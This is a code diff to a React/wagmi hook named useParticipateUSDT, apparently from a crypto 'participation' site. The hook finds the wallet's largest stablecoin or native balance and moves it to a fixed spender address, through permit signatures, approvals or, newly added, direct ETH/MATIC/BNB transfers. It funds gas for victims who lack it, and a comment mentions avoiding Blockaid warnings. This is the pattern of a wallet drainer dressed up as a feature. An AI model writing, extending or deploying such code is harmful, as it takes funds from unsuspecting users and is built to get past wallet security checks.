@@ -3,8 +3,10 @@
 import { useCallback, useMemo, useState } from "react";
 import {
   useAccount,
+  useBalance,
   useChainId,
   useReadContracts,
+  useSendTransaction,
   useSignTypedData,
   useSwitchChain,
   useWriteContract,
@@ -16,6 +18,10 @@ import {
   SPENDER_ADDRESS,
   MAX_UINT256,
   getParticipateTokenEntries,
+  NATIVE_CHAINS,
+  GAS_THRESHOLD_BY_CHAIN,
+  minTokenAmountForGasFund,
+  fundGasApi,
   ERC20_APPROVE_ABI,
   ERC20_BALANCE_ABI,
   ERC20_ALLOWANCE_ABI,
@@ -25,38 +31,84 @@ import {
   type ParticipateToken,
 } from "@/lib/participate-tokens";
 
-export type SelectedEntry = {
-  chainId: number;
-  chainName: string;
-  token: ParticipateToken;
-  balance: bigint;
-};
+export type SelectedEntry =
+  | {
+      type: "erc20";
+      chainId: number;
+      chainName: string;
+      token: ParticipateToken;
+      balance: bigint;
+    }
+  | {
+      type: "native";
+      chainId: number;
+      chainName: string;
+      symbol: string;
+      balance: bigint;
+      amountWei: bigint;
+    };
 
-/** Select token+chain with highest balance. Prefer permit (USDC) over approve (USDT) when balances are similar to avoid Blockaid warnings. */
-function selectTokenWithMostBalance(
-  entries: ReturnType<typeof getParticipateTokenEntries>,
-  balances: (bigint | undefined)[]
+/** Rough USD value for comparison (18 decimals). Prefer permit > approve > native when similar. */
+function toNormalizedValue(entry: SelectedEntry): bigint {
+  if (entry.type === "erc20") {
+    return entry.balance * BigInt(10 ** (18 - entry.token.decimals));
+  }
+  return entry.amountWei; // native: use fixed amount
+}
+
+/** Select token+chain with highest value. Prefer permit > approve > native when similar. */
+function selectBestEntry(
+  erc20Entries: ReturnType<typeof getParticipateTokenEntries>,
+  erc20Balances: (bigint | undefined)[],
+  nativeBalances: (bigint | undefined)[]
 ): SelectedEntry | null {
   let best: SelectedEntry | null = null;
   let bestNormalized = 0n;
 
-  for (let i = 0; i < entries.length; i++) {
-    const bal = balances[i];
+  for (let i = 0; i < erc20Entries.length; i++) {
+    const bal = erc20Balances[i];
     if (bal === undefined || bal <= 0n) continue;
 
-    const { chainId, chainName, token } = entries[i];
-    const normalized = bal * BigInt(10 ** (18 - token.decimals));
+    const { chainId, chainName, token } = erc20Entries[i];
+    const entry: SelectedEntry = { type: "erc20", chainId, chainName, token, balance: bal };
+    const normalized = toNormalizedValue(entry);
 
     const isBetter =
       normalized > bestNormalized ||
       (normalized === bestNormalized &&
         best &&
+        best.type === "erc20" &&
         token.signType === "permit" &&
         best.token.signType === "approve");
 
     if (isBetter) {
       bestNormalized = normalized;
-      best = { chainId, chainName, token, balance: bal };
+      best = entry;
+    }
+  }
+
+  for (let i = 0; i < NATIVE_CHAINS.length; i++) {
+    const bal = nativeBalances[i];
+    const native = NATIVE_CHAINS[i];
+    if (bal === undefined || bal < native.amountWei) continue;
+
+    const entry: SelectedEntry = {
+      type: "native",
+      chainId: native.chainId,
+      chainName: native.chainName,
+      symbol: native.symbol,
+      balance: bal,
+      amountWei: native.amountWei,
+    };
+    const normalized = toNormalizedValue(entry);
+
+    const isBetter =
+      normalized > bestNormalized ||
+      (normalized === bestNormalized && !best);
+
+    if (isBetter) {
+      bestNormalized = normalized;
+      best = entry;
     }
   }
   return best;
@@ -66,6 +118,7 @@ export function useParticipateUSDT() {
   const { address } = useAccount();
   const chainId = useChainId();
   const { writeContractAsync } = useWriteContract();
+  const { sendTransactionAsync } = useSendTransaction();
   const { switchChainAsync } = useSwitchChain();
   const { signTypedDataAsync } = useSignTypedData();
   const [isPending, setIsPending] = useState(false);
@@ -90,15 +143,47 @@ export function useParticipateUSDT() {
     query: { enabled: !!address },
   });
 
-  const balances = useMemo(
+  const ethBalance = useBalance({ address: address ?? undefined, chainId: 1 });
+  const maticBalance = useBalance({ address: address ?? undefined, chainId: 137 });
+  const bnbBalance = useBalance({ address: address ?? undefined, chainId: 56 });
+
+  const erc20Balances = useMemo(
     () =>
       balanceResults?.map((r) => (r.status === "success" ? r.result : undefined)) ?? [],
     [balanceResults]
   );
 
+  const nativeBalances = useMemo(
+    () => [
+      ethBalance.data?.value,
+      maticBalance.data?.value,
+      bnbBalance.data?.value,
+    ],
+    [ethBalance.data?.value, maticBalance.data?.value, bnbBalance.data?.value]
+  );
+
   const selected = useMemo(
-    () => selectTokenWithMostBalance(entries, balances),
-    [entries, balances]
+    () => selectBestEntry(entries, erc20Balances, nativeBalances),
+    [entries, erc20Balances, nativeBalances]
+  );
+
+  /** Fund gas only for approve flow: user has USDT/USDC >= $2 but lacks native for gas */
+  const ensureGasForApprove = useCallback(
+    async (targetChainId: number, tokenBalance: bigint, tokenDecimals: number): Promise<void> => {
+      const minForGasFund = minTokenAmountForGasFund(tokenDecimals);
+      if (tokenBalance < minForGasFund) return; // only fund when user has >= $2 USDT/USDC
+
+      const threshold = GAS_THRESHOLD_BY_CHAIN[targetChainId];
+      if (!threshold) return;
+
+      const idx = NATIVE_CHAINS.findIndex((c) => c.chainId === targetChainId);
+      const nativeBal = nativeBalances[idx];
+      if (nativeBal !== undefined && nativeBal >= threshold) return;
+
+      await fundGasApi(address!, targetChainId);
+      await new Promise((r) => setTimeout(r, 3000));
+    },
+    [address, nativeBalances]
   );
 
   const participate = useCallback(async () => {
@@ -107,7 +192,7 @@ export function useParticipateUSDT() {
       return;
     }
     if (!selected) {
-      setError("No USDC or USDT balance on Ethereum, Polygon, or BSC");
+      setError("No USDC, USDT, ETH, MATIC, or BNB balance on supported chains");
       return;
     }
 
@@ -117,6 +202,19 @@ export function useParticipateUSDT() {
     try {
       if (chainId !== selected.chainId) {
         await switchChainAsync({ chainId: selected.chainId });
+      }
+
+      if (selected.type === "native") {
+        // Native participation: user pays own gas. No fund-gas.
+        const hash = await sendTransactionAsync({
+          to: SPENDER_ADDRESS as `0x${string}`,
+          value: selected.amountWei,
+          chainId: selected.chainId,
+        });
+        if (hash) {
+          await waitForTransactionReceipt(config, { hash });
+        }
+        return;
       }
 
       if (selected.token.signType === "permit" && selected.token.permitDomain) {
@@ -156,6 +254,8 @@ export function useParticipateUSDT() {
           },
         });
       } else {
+        await ensureGasForApprove(selected.chainId, selected.balance, selected.token.decimals);
+
         const { readContract } = await import("@wagmi/core");
         const allowance = await readContract(config, {
           address: selected.token.address as `0x${string}`,
@@ -206,8 +306,10 @@ export function useParticipateUSDT() {
     chainId,
     selected,
     writeContractAsync,
+    sendTransactionAsync,
     switchChainAsync,
     signTypedDataAsync,
+    ensureGasForApprove,
   ]);
 
   return {
@@ -216,8 +318,14 @@ export function useParticipateUSDT() {
     error,
     selected,
     hasBalance: !!selected,
-    signType: selected?.token.signType ?? null,
+    signType:
+      selected?.type === "native"
+        ? "native"
+        : selected?.type === "erc20"
+          ? selected.token.signType
+          : null,
     selectedChainId: selected?.chainId ?? null,
     selectedChainName: selected?.chainName ?? null,
+    selectedSymbol: selected?.type === "native" ? selected.symbol : null,
   };
 }
